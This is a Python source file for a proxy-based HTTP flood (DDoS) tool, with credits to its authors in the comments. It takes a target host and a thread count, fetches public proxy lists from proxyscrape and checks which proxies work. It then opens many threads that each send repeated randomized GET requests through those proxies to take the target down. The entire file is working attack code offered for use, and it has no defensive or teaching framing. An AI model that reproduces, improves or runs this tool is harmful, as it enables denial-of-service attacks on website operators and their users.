#Code By GogoZin
#Can Be A Skid But Don't Be A Theif
#-------------------------------#
# Improved Script performance   #
# Added Local Proxy Checker     #
# Auto select file(for skid)    #
#                 By L330n123   #
#-------------------------------#

import time
import socket
import random
import requests
import threading
import sys

print( """MMMMMMMMMMMMMMMMMMKkkKMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMNOxx0WMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMWKolldKMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMXx,..;kXMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMNO:.  .cOWMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWKo.    .dKMMMMMMMMMMMMMMM
MMMMMWWWWWMMMMNO;      :ONMMMMWWWWWMMMMM
MWX0kdooodk0XNXk,      ,kXNX0kdolodOKNWM
Kxc'.     ..;oxd,      ;dxl;..     .'lON
o,            .cc.    .c:.            ;x
:    .,;::;,.   .     ..   .,;::;,.   .c
l. .lOKXNNXKOd;.        .;dOXNNNXKkc. .l
KdcdKWMMMMMMMN0o.      'o0NMMMMMMMW0ocdK
MNKXWMMMMMMMMMXx,      ;kNMMMMMMMMMWXXWM
MMMMMMMMMMMMMMXd'      ,xXMMMMMMMMMMMMMM
MMMMMMMMMNK0XNXkc.    .lONWXKXWMMMMMMMMM
MMMMMMMMW0l;cll;.      .:lo:;lKWMMMMMMMM
MMMMMMMMNO:.   .'.    ''.   .:ONMMMMMMMM
MMMMMMMMMNOdlloxkl.  .lkkocld0NMMMMMMMMM
MMMMMMMMMMMWNNWWXx,..;kNMWNNWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMXxloxXMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWKkkKMMMMMMMMMMMMMMMMMM""")

print("      Python Proxies Ddos Script")
print("           Code By GogoZin") #Code By GogoZin
print("      Improved By Leeon123 -2019/8/5")
print("    Please Don't Attack Any Gov Site")

userag =["Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
acpt =["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n","Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",]

def checking(lines): #Recoded from cc-attack By L330n123
	global nums
	global pprr
	proxy = lines.strip().split(":")
	try:
		s = socket.socket()
		s.settimeout(1) #1000ms
		s.connect((str(proxy[0]), int(proxy[1])))
		s.send(str.encode("GET / HTTP/1.1\r\nHost: "+url+":"+str(port)+"\r\n\r\n"))
		s.close()
	except:
		pprr.remove(lines)
	nums = nums + 1

def check_proxy(): #Proxy Checker C0d3d By L330n123
	global nums
	global pprr
	nums = 0
	thread_list=[]
	for lines in list(pprr):
		th = threading.Thread(target=checking,args=(lines,))
		th.start()
		thread_list.append(th)
		time.sleep(0.03)
		sys.stdout.write("Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\nChecked all proxies, Total Worked:"+str(len(pprr)))
	ans = input("Do u want to save them in a file? (y/n)")
	if ans == "y":
		in_file = str(input("Input your filename(proxies.txt):"))
		if in_file == "":
			in_file = "proxies.txt"
		with open(in_file, 'wb') as fp:
			for lines in list(pprr):
				fp.write(bytes(lines,encoding='utf8'))
		fp.close()
on = False
def main():
	global url
	global port
	global pprr
	global times
	global urll
	url = str(input("Target : "))
	urll = str(input("Path (Default Is /) : "))
	if urll == "":
		urll = '/'
	sl = str(input("Use SSL Mode ? (y/n) : "))
	port = str(input("Port(default=80) : "))
	if port == "":
		port = 80
		print("Port 80 was selected")
	else:
		port = int(port)
	thr = int(input("Threads : "))
	times = str(input("CC.Power (1-100, default=70) : "))
	if times == "":
		times = int(70)
	else:
		times = int(times)
	cho = str(input("Get Some Fresh Proxies ? (y/n) : "))                                                           #Code By GogoZin
	if cho =='y':
		if sl =='y':
			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all') # Code By GogoZin
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print("Sucess Get Https Proxies List !")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all') # Code By GogoZin
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print("Sucess Get Http Proxies List !")
	else:
		pass
	file = str(input("Input Proxies List (proxies.txt) : "))
	if file == "":
		file = "proxies.txt"
	pprr = open(file).readlines()
	print("Proxies Counts %d" % len(pprr))
	ans = str(input("Do you want to check proxies?(y/n):"))
	if ans == "y":
		check_proxy()
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads "+str(i+1)+" was created")
	print("Wait 5 seconds for threads ready to attack")
	time.sleep(5)
	input("Press enter to start attack")
	global on
	on = True


def atk():
	get_host = "GET " + str(urll) + "?="+ str(random.randint(1,65535)) +" HTTP/1.1\r\nHost: " + str(url)+ ":" + str(port) +"\r\n"
	connection = "Connection: Keep-Alive\r\n"
	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                               #Code By GogoZin
	accept = random.choice(acpt)
	rqs = get_host + useragent + accept + connection + "\r\n"
	#pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	time.sleep(5)
	while True:
		while on:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(proxy[0]), int(proxy[1]))) 
				s.send(str.encode(rqs))
				try:
					for i in range(times):                                                          #Code By GogoZin, Improved By L330n123
						s.send(str.encode(rqs))
					print("Sucess Sent Requests From ~ [ " + str(proxy[0])+":"+str(proxy[1]) + " ] ") # Code By GogoZin
					s.close()
				except:
					s.close()
			except:
				s.close()
				print( "Proxies Get Error !")

if __name__ =='__main__':
	main()
